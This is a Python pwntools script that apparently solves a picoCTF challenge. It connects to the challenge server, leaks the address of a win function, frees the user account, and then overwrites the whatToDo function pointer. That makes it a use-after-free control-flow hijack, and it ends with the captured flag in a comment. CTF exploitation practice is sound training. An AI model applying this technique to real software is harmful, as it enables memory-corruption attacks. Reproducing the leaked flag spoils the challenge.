import sys
import re
from pwn import *

conn = process('./vuln')
conn = remote('mercury.picoctf.net', 58574)

# Get win address
conn.recvuntil('(e)xit\n')
conn.sendline('s')
win_addr = conn.recvuntil('(e)xit\n').decode()
win_addr = re.search(r'0x(.*)\nThanks', win_addr).group(1)
win_addr = int(win_addr, 16)
log.info('Win address: {}'.format(hex(win_addr)))

# Free user account
conn.sendline('i')
conn.sendline('y')
conn.recvuntil('(e)xit\n')

# Set jump address
log.info('Overwriting whatToDo address...')
conn.sendline('l')
conn.sendline(p32(win_addr))
conn.interactive()

# picoCTF{d0ubl3_j30p4rdy_ec42c6fc}
